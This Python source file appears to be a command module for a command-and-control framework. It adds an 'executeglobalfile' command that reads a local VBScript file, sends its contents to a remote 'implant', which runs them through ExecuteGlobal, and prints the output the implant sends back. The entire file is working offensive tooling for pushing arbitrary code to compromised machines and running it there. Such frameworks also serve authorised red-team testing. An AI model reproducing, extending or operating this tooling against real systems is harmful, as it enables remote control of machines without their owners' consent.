from features import addFeature
import messages
from messages import OutgoingMessage

class ExecuteGlobalFileCommand():
  command = 'executeglobalfile'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      # note here 
      filename = ' '.join(arguments)

      f = open(filename,mode='r')
      contents = f.read()
      f.close()

      message = OutgoingMessage('executeglobal', bytes(contents, 'ascii'))
      implant.queueOutgoingMessage(message)

  def help():
    return 'Evaluate expressions from a local file in the implant\'s native language runtime using ExecuteGlobal. Usage: executeglobalfile filename.vbs'

  def incoming(data, implant):
    try:
      data = str(data, 'utf-8') 
      print(data, end = '\n', flush=True)
    except:
      print('Received unencodable executeglobalfile data from ' + implant.name + ': ' + data.hex())

addFeature(ExecuteGlobalFileCommand)
